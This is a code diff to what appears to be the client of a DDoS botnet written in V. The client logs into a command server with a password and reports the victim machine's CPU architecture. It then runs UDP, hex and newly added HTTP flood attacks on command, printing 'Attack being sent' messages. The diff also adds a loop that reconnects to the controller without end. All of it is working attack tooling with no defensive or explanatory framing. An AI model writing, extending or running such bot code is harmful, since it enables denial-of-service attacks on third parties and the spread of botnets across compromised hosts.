@@ -5,9 +5,11 @@ import time
 
 #include "@VROOT/core/methods/udp.c"
 #include "@VROOT/core/methods/stdhex.c"
+#include "@VROOT/core/methods/http.c"
 
 fn C.udp_bypass(&char, u16, int)
 fn C.stdhex(&char, int, int)
+fn C.sendHTTP(&char, int)
 
 fn main() {
 	mut args := os.args.clone()
@@ -16,7 +18,11 @@ fn main() {
 		exit(0)
 	}
 	mut s := go server(args[1], args[2], args[3])
-	s.wait()
+
+	for {
+		s.wait()
+		s = go server(args[1], args[2], args[3])
+	}
 }
 
 fn server(ip string, port string, pw string) { 
@@ -29,7 +35,7 @@ fn server(ip string, port string, pw string) {
 	server.write_string("${pw}\n") or { 0 } // Send PW
 	time.sleep(1*time.second)
 
-	server.write_string("cpu_here\n") or { 0 } // Send CPU ARCH
+	server.write_string((os.execute("lscpu | grep Architecture").output).replace("Architecture: ", "").trim_space() + "\n") or { 0 } // Send CPU ARCH
 	for {
 		data := (reader.read_line() or { "" }).replace("\r\n", "")
 		fcmd, cmd, args := parse_buffer(data)
@@ -50,6 +56,15 @@ fn server(ip string, port string, pw string) {
 					} else {
 						server.write_string("[ + ] Attack being sent....\n") or { 0 }
 						C.stdhex(&char(args[1].str), args[2].int(), args[3].int())
+						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
+					}
+				}
+				"http" {
+					if args.len < 3 {
+						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
+					} else {
+						server.write_string("[ + ] Attack being sent....\n") or { 0 }
+						C.sendHTTP(&char(args[1].str), args[2].int())
 						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
 					}
 				}
